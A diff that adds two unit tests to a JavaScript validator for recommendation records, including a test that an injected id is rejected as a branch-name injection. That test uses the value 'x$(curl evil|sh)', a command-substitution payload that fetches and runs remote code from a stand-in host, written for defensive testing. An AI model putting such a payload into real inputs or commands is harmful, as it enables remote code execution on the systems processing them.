@@ -29,6 +29,16 @@ test('validate: accepts a well-formed low-risk recommendation', () => {
   assert.deepStrictEqual(errors, []);
 });
 
+test('validate: accepts status:promoted (agentic-flywheel Phase B)', () => {
+  const { errors } = validate(rec({ status: 'promoted', pr_url: 'https://github.com/x/y/pull/1' }));
+  assert.deepStrictEqual(errors, []);
+});
+
+test('validate: rejects an id that does not match REC-YYYYMMDD-NNN (branch-name injection choke point)', () => {
+  const { errors } = validate(rec({ id: 'x$(curl evil|sh)' }));
+  assert.ok(errors.some((e) => /format/i.test(e)));
+});
+
 test('validate: rejects missing required fields', () => {
   const { errors } = validate({ id: 'REC-1' });
   assert.ok(errors.some((e) => /target/.test(e)));
